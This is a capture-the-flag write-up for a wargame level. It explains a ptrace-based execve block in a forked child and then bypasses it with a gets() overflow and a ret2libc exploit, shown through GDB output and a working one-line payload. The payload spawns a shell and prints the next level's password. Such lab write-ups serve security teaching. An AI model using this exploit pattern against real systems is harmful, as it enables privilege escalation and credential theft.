# level04

In this program, a new child process is spawn using `fork()`. The parent then proceed to `wait` the child. The use `ptrace(PTRACE_ME)`, which, according to the manual : 

>    PTRACE_TRACEME
              Indicates that this process is to be traced by its parent.  Any signal (except SIGKILL) delivered to this process will cause it to stop and its parent to  be  notified  via  wait(2).   Also,  all  subsequent  calls  to
              execve(2)  by  this process will cause a SIGTRAP to be sent to it, giving the parent a chance to gain control before the new program begins execution.  A process probably shouldn't make this request if its parent isn't
              expecting to trace it.  (pid, addr, and data are ignored.)

The child has an obvious buffer-overflow vulnerability because of the usage of `gets`, granting us **saved-eip** overwrite. The NX bit of the executable is disabled, which mean we can execute arbitrary code in the stack.

Whenever the child will try to `execve`, a `SIGTRAP` will wake up the parent. Right after, the parent proceed to get the value of the `eax` register in the child process, and if it contains the value `11`, which correspond to the sysno for `execve` on x86 Linux, the parent immediately send a `SIGKILL` to the child. This prevent us from launching a shellcode that try to use `execve`. 

My initial approach was to craft a shellcode that use `execveat` syscall instead. Unfortunatly, the Linux kernel that the host has is too old and does not implement `execveat`, returning **errno** `ENOSYS` in the `eax` register with `int 0x80`.

## ret2libc

Instead of crafting a shellcode, we can take advantage of the fact that the libc is loaded into memory and has already some really usefull fuction like `system` for attackers.
We can overwrite the **saved-eip** with the address of the `system` function, and set-up the stack so the first argument is a pointer to a `/bin/sh` string. With **GDB**, we can find these easily.

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mappings
process 2893
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2b000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/1s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

The address of `system` is at `0xf7e6aed0` and the address of `/bin/sh` is at `0xf7f897ec`. How convenient that the **libc** even has such string !

## Payload

After deducing how much garbage bytes we need to write before overwriting the **saved-eip**, we overwrite it to the address of `system` and set-up the call stack so that `system` first argument is the pointer to `/bin/sh` :

```bash
level04@OverRide:~$ (python -c 'print("A"*156 + "\xF7\xE6\xAE\xD0"[::-1] + "B"*4 + "\xF7\xF8\x97\xEC"[::-1])'; cat) | ./level04
Give me some shellcode, k
whoami
level05
cd ../level05
cat .pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

Success !